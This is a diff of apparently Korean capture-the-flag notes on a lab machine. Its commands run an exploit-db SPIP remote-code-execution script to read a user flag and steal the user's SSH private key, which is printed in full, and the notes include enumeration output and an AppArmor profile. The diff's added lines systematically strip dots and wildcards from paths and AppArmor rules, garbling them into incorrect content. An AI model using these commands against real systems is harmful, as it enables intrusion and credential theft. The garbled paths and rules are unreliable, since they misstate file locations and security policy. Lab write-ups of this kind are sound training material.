@@ -580,13 +580,13 @@ drwxr-x--- 5 www-data www-data 4096 Dec 20 2023 spip
 
 python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "cat /home/think/user.txt" --verbose
 fa229046d44eda6a3598c73ad96f4ca5
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "ls -al /home/think/.ssh" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "ls -al /home/thinkssh" --verbose
 
 -rw-r--r-- 1 root root 569 Jan 10 2024 authorized_keys
 -rw-r--r-- 1 think think 2602 Jan 10 2024 id_rsa
 -rw-r--r-- 1 think think 569 Jan 10 2024 id_rsa.pub
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "cat /home/think/.ssh/id_rsa" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "cat /home/thinkssh/id_rsa" --verbose
 
 # RSA 탈취
 
@@ -636,13 +636,13 @@ Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==
 ┌──(root㉿docker-desktop)-[/]
 └─# sudo ssh -i think.pem think@10.201.17.89
 
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
+ WARNING: connection is not using a post-quantum key exchange algorithm.
+ This session may be vulnerable to "store now, decrypt later" attacks.
 \*\* The server may need to be upgraded. See https://openssh.com/pq.html
 Load key "think.pem": error in libcrypto
 think@10.201.17.89's password:
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "cat /home/think/.ssh/authorized_keys" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "cat /home/thinkssh/authorized_keys" --verbose
 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDE+9z2mKOlQkDiiXK+RbSvJgBIGl2YFqw4SWzo5HDsUyCM9bzq0Mq4hfJmd4EhRqsmJmHxXMWqYpFhyKgPCUnOr73/aKlAdNXM2PHGDXzBa8XRacraUjlNDtBdw5jz7UJRVfrvLhResoBJ/yXuU8ogQPbhteOQMGRWsIwfBJxBuD+cggXHKLbrYmglOOH0mDFIGNoM4QsEHHJ2/vxgw313Jp8iYBdhf3ofmT7y8Lz8jduTCIKeG4oonXVNXhvyUyxuuCpthFh9sIlqkHbvMnbhrVpHlSf4RzZdXZ9rCGZ+1LTlvXQzRACcMS7tIZcb2YX+EsnKF5F7yW/6uTkSRk2CHXhilcb8T3IhvEH1F/mTR6TGh1mNVXTqKogcGiZxCsqi1XmdcFE+BV4fvUmBVAWQ1DKpUzjB/qg4NKpCy4i+eQHmX17T3mwkPDPWmP9pMvdnpnbwqA8oKM4Qu+QA9ydy4xBO77PpBVSvRwKOBJGHDgbL9t8niUvJf9tyIvlCjJ0= think@publisher
 
@@ -790,11 +790,11 @@ think@ip-10-201-106-230:~$ find / -writable -type d 2>/dev/null
 /proc/2126/fd
 /proc/2126/map_files
 /tmp
-/tmp/.ICE-unix
-/tmp/.Test-unix
-/tmp/.font-unix
-/tmp/.X11-unix
-/tmp/.XIM-unix
+/tmpICE-unix
+/tmpTest-unix
+/tmpfont-unix
+/tmpX11-unix
+/tmpXIM-unix
 /sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
 /sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/pulseaudio.service
 /sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
@@ -806,15 +806,15 @@ think@ip-10-201-106-230:~$ find / -writable -type d 2>/dev/null
 /sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
 /sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.service
 /home/think
-/home/think/.gnupg
-/home/think/.gnupg/private-keys-v1.d
-/home/think/.cache
-/home/think/.local
-/home/think/.local/share
-/home/think/.local/share/nano
-/home/think/.ssh
-/home/think/.config
-/home/think/.config/pulse
+/home/thinkgnupg
+/home/thinkgnupg/private-keys-v1.d
+/home/thinkcache
+/home/thinklocal
+/home/thinklocal/share
+/home/thinklocal/share/nano
+/home/thinkssh
+/home/thinkconfig
+/home/thinkconfig/pulse
 /run/user/1000
 /run/user/1000/dbus-1
 /run/user/1000/dbus-1/services
@@ -1124,7 +1124,7 @@ drwxr-xr-x 2 root root 4096 Apr 27  2025 /usr/share/keyrings
 
 ╔══════════╣ Analyzing Cache Vi Files (limit 70)
 
-lrwxrwxrwx 1 think think 9 Feb 10  2024 /home/think/.viminfo -> /dev/null
+lrwxrwxrwx 1 think think 9 Feb 10  2024 /home/thinkviminfo -> /dev/null
 
 ╔══════════╣ Analyzing Postfix Files (limit 70)
 -rw-r--r-- 1 root root 813 Feb  2  2020 /usr/share/bash-completion/completions/postfix
@@ -1150,17 +1150,17 @@ lrwxrwxrwx 1 think think 9 Feb 10  2024 /home/think/.viminfo -> /dev/null
 
 
 ╔══════════╣ Analyzing Other Interesting Files (limit 70)
--rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
--rw-r--r-- 1 think think 3771 Nov 14  2023 /home/think/.bashrc
--rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 /home/ubuntu/.bashrc
+-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skelbashrc
+-rw-r--r-- 1 think think 3771 Nov 14  2023 /home/thinkbashrc
+-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 /home/ubuntubashrc
 
 
 
 
 
--rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
--rw-r--r-- 1 think think 807 Nov 14  2023 /home/think/.profile
--rw-r--r-- 1 ubuntu ubuntu 807 Feb 25  2020 /home/ubuntu/.profile
+-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skelprofile
+-rw-r--r-- 1 think think 807 Nov 14  2023 /home/thinkprofile
+-rw-r--r-- 1 ubuntu ubuntu 807 Feb 25  2020 /home/ubuntuprofile
 
 
 
@@ -1248,7 +1248,7 @@ netpgp Not Found
 -rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
 -rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
 -rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
--rw------- 1 think think 1200 Nov 14  2023 /home/think/.gnupg/trustdb.gpg
+-rw------- 1 think think 1200 Nov 14  2023 /home/thinkgnupg/trustdb.gpg
 -rw-r--r-- 1 root root 3267 Mar 29  2025 /usr/share/gnupg/distsigkey.gpg
 -rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
 -rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
@@ -1268,7 +1268,7 @@ netpgp Not Found
 -rw-r--r-- 1 root root 2236 Jun 21  2023 /var/lib/ubuntu-advantage/apt-esm/etc/apt/trusted.gpg.d/ubuntu-advantage-esm-apps.gpg
 
 
-drwx------ 3 think think 4096 Nov  9 11:08 /home/think/.gnupg
+drwx------ 3 think think 4096 Nov  9 11:08 /home/thinkgnupg
 
 ╔══════════╣ Checking if runc is available
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#runc--privilege-escalation
@@ -1283,7 +1283,7 @@ passwd file: /usr/share/lintian/overrides/passwd
 ╔══════════╣ Searching ssl/ssh files
 ╔══════════╣ Analyzing SSH Files (limit 70)
 
--rw-r--r-- 1 think think 2602 Jan 10  2024 /home/think/.ssh/id_rsa
+-rw-r--r-- 1 think think 2602 Jan 10  2024 /home/thinkssh/id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK
@@ -1322,25 +1322,25 @@ LsHpJjf7fAUXSGQfCc0Z06gFMtmhwZUuYEH9JjZbG2oLnn47BdOnumAOE/mRxDelSOv5J5
 M8X1rGlGEnXqGuw917aaHPPBnSfquimQkXZ55yyI9uhtc6BrRanGRlEYPOCR18Ppcr5d96
 Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==
 -----END OPENSSH PRIVATE KEY-----
--rw-r--r-- 1 think think 569 Jan 10  2024 /home/think/.ssh/id_rsa.pub
+-rw-r--r-- 1 think think 569 Jan 10  2024 /home/thinkssh/id_rsa.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDE+9z2mKOlQkDiiXK+RbSvJgBIGl2YFqw4SWzo5HDsUyCM9bzq0Mq4hfJmd4EhRqsmJmHxXMWqYpFhyKgPCUnOr73/aKlAdNXM2PHGDXzBa8XRacraUjlNDtBdw5jz7UJRVfrvLhResoBJ/yXuU8ogQPbhteOQMGRWsIwfBJxBuD+cggXHKLbrYmglOOH0mDFIGNoM4QsEHHJ2/vxgw313Jp8iYBdhf3ofmT7y8Lz8jduTCIKeG4oonXVNXhvyUyxuuCpthFh9sIlqkHbvMnbhrVpHlSf4RzZdXZ9rCGZ+1LTlvXQzRACcMS7tIZcb2YX+EsnKF5F7yW/6uTkSRk2CHXhilcb8T3IhvEH1F/mTR6TGh1mNVXTqKogcGiZxCsqi1XmdcFE+BV4fvUmBVAWQ1DKpUzjB/qg4NKpCy4i+eQHmX17T3mwkPDPWmP9pMvdnpnbwqA8oKM4Qu+QA9ydy4xBO77PpBVSvRwKOBJGHDgbL9t8niUvJf9tyIvlCjJ0= think@publisher
 
 
 
--rw-r--r-- 1 root root 569 Jan 10  2024 /home/think/.ssh/authorized_keys
+-rw-r--r-- 1 root root 569 Jan 10  2024 /home/thinkssh/authorized_keys
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDE+9z2mKOlQkDiiXK+RbSvJgBIGl2YFqw4SWzo5HDsUyCM9bzq0Mq4hfJmd4EhRqsmJmHxXMWqYpFhyKgPCUnOr73/aKlAdNXM2PHGDXzBa8XRacraUjlNDtBdw5jz7UJRVfrvLhResoBJ/yXuU8ogQPbhteOQMGRWsIwfBJxBuD+cggXHKLbrYmglOOH0mDFIGNoM4QsEHHJ2/vxgw313Jp8iYBdhf3ofmT7y8Lz8jduTCIKeG4oonXVNXhvyUyxuuCpthFh9sIlqkHbvMnbhrVpHlSf4RzZdXZ9rCGZ+1LTlvXQzRACcMS7tIZcb2YX+EsnKF5F7yW/6uTkSRk2CHXhilcb8T3IhvEH1F/mTR6TGh1mNVXTqKogcGiZxCsqi1XmdcFE+BV4fvUmBVAWQ1DKpUzjB/qg4NKpCy4i+eQHmX17T3mwkPDPWmP9pMvdnpnbwqA8oKM4Qu+QA9ydy4xBO77PpBVSvRwKOBJGHDgbL9t8niUvJf9tyIvlCjJ0= think@publisher
 
 -rw-r--r-- 1 root root 183 Nov  9 10:57 /etc/ssh/ssh_host_ecdsa_key.pub
 -rw-r--r-- 1 root root 103 Nov  9 10:57 /etc/ssh/ssh_host_ed25519_key.pub
 -rw-r--r-- 1 root root 575 Nov  9 10:57 /etc/ssh/ssh_host_rsa_key.pub
--rw-r--r-- 1 think think 569 Jan 10  2024 /home/think/.ssh/id_rsa.pub
+-rw-r--r-- 1 think think 569 Jan 10  2024 /home/thinkssh/id_rsa.pub
 
 ChallengeResponseAuthentication no
 UsePAM yes
 PasswordAuthentication yes
 
 ══╣ Possible private SSH keys were found!
-/home/think/.ssh/id_rsa
+/home/thinkssh/id_rsa
 
 ══╣ Some certificates were found (out limited):
 /etc/pki/fwupd/LVFS-CA.pem
@@ -1527,15 +1527,15 @@ drwxr-xr-x 132 root root 12288 Nov  9 10:57 ..
 
 ╔══════════╣ Searching root files in home dirs (limit 30)
 /home/
-/home/think/.bash_history
-/home/think/.ssh/authorized_keys
+/home/thinkbash_history
+/home/thinkssh/authorized_keys
 /home/think/user.txt
 /root/
 /var/www
 
 ╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
 -rw-r--r-- 1 root root 35 Feb 10  2024 /home/think/user.txt
--rw-r--r-- 1 root root 569 Jan 10  2024 /home/think/.ssh/authorized_keys
+-rw-r--r-- 1 root root 569 Jan 10  2024 /home/thinkssh/authorized_keys
 
 ╔══════════╣ Readable files belonging to root and readable by me but not world readable
 
@@ -1561,11 +1561,11 @@ drwxr-xr-x 132 root root 12288 Nov  9 10:57 ..
 /run/user/1000/systemd
 /run/user/1000/systemd/units
 /tmp
-/tmp/.font-unix
-/tmp/.ICE-unix
-/tmp/.Test-unix
+/tmpfont-unix
+/tmpICE-unix
+/tmpTest-unix
 /tmp/tmux-1000
-/tmp/.X11-unix
+/tmpX11-unix
 #)You_can_write_even_more_files_inside_last_directory
 
 /var/crash
@@ -1665,7 +1665,7 @@ drwx--x--x  4 root root 4096 Nov 14  2023 containerd
 -rwxrwxrwx  1 root root 1715 Jan 10  2024 run_container.sh
 
 ╔══════════╣ Unexpected in root
-/.badr-info
+badr-info
 /swap.img
 
 ╔══════════╣ Modified interesting files in the last 5mins (limit 100)
@@ -1768,9 +1768,9 @@ drwxr-xr-x 2 think    think    4096 Jan 10  2024 .ssh
 lrwxrwxrwx 1 think    think       9 Feb 10  2024 .viminfo -> /dev/null
 
 ╔══════════╣ Files inside others home (limit 20)
-/home/ubuntu/.profile
-/home/ubuntu/.bashrc
-/home/ubuntu/.bash_logout
+/home/ubuntuprofile
+/home/ubuntubashrc
+/home/ubuntubash_logout
 
 ╔══════════╣ Searching installed mail applications
 
@@ -1824,7 +1824,7 @@ total 40
 -rw-r--r-- 1 root staff 11669 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/google/cloud/spanner_v1/__pycache__/backup.cpython-38.pyc
 -rwxr-xr-x 1 root root 1086 Oct 31  2021 /usr/src/linux-hwe-5.15-headers-5.15.0-138/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
 
-╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+╔══════════╣ Searching tables inside readable .dbsqlsqlite files (limit 100)
 Found /etc/apparmor/severity.db: ASCII text
 Found /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3031001
 Found /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3031001
@@ -1846,19 +1846,19 @@ drwxr-xr-x 13 root     root     4.0K Nov 11  2023 ..
 drwxrwx---  2 www-data www-data 4.0K Nov 13  2023 html
 
 ╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
--rw-r--r-- 1 root root 191 Nov  9 10:57 /.badr-info
--rw-r--r-- 1 landscape landscape 0 Feb 23  2022 /var/lib/landscape/.cleanup.user
--rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
--rw------- 1 root root 0 Feb 23  2022 /etc/.pwd.lock
--rw-r--r-- 1 ubuntu ubuntu 220 Feb 25  2020 /home/ubuntu/.bash_logout
--rw-r--r-- 1 think think 220 Nov 14  2023 /home/think/.bash_logout
--rw-r--r-- 1 root root 0 Nov  9 10:57 /run/ubuntu-fan/.lock
--rw-r--r-- 1 root root 20 Nov  9 10:57 /run/cloud-init/.instance-id
--rw-r--r-- 1 root root 2 Nov  9 10:56 /run/cloud-init/.ds-identify.result
--rw-r--r-- 1 root root 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
--rw-r--r-- 1 root staff 58 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/numpy/core/include/numpy/.doxyfile
--rw-r--r-- 1 root staff 29 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/numpy/f2py/tests/src/assumed_shape/.f2py_f2cmap
--rw-r--r-- 1 root staff 82 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/numpy/f2py/tests/src/f2cmap/.f2py_f2cmap
+-rw-r--r-- 1 root root 191 Nov  9 10:57 badr-info
+-rw-r--r-- 1 landscape landscape 0 Feb 23  2022 /var/lib/landscapecleanup.user
+-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skelbash_logout
+-rw------- 1 root root 0 Feb 23  2022 /etcpwd.lock
+-rw-r--r-- 1 ubuntu ubuntu 220 Feb 25  2020 /home/ubuntubash_logout
+-rw-r--r-- 1 think think 220 Nov 14  2023 /home/thinkbash_logout
+-rw-r--r-- 1 root root 0 Nov  9 10:57 /run/ubuntu-fanlock
+-rw-r--r-- 1 root root 20 Nov  9 10:57 /run/cloud-initinstance-id
+-rw-r--r-- 1 root root 2 Nov  9 10:56 /run/cloud-initds-identify.result
+-rw-r--r-- 1 root root 0 Nov 15  2018 /usr/share/dictionaries-common/site-elispnosearch
+-rw-r--r-- 1 root staff 58 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/numpy/core/include/numpydoxyfile
+-rw-r--r-- 1 root staff 29 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/numpy/f2py/tests/src/assumed_shapef2py_f2cmap
+-rw-r--r-- 1 root staff 82 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/numpy/f2py/tests/src/f2cmapf2py_f2cmap
 
 ╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
 
@@ -2703,12 +2703,12 @@ think@ip-10-201-17-89:/etc/apparmor.d$ cat usr.sbin.ash
 # Deny access to certain directories
 
 deny /opt/ r,
-deny /opt/** w,
-deny /tmp/** w,
+deny /opt/ w,
+deny /tmp/ w,
 deny /dev/shm w,
 deny /var/tmp w,
-deny /home/** w,
-/usr/bin/** mrix,
+deny /home/ w,
+/usr/bin/ mrix,
 /usr/sbin/\*\* mrix,
 
 # Simplified rule for accessing /home directory
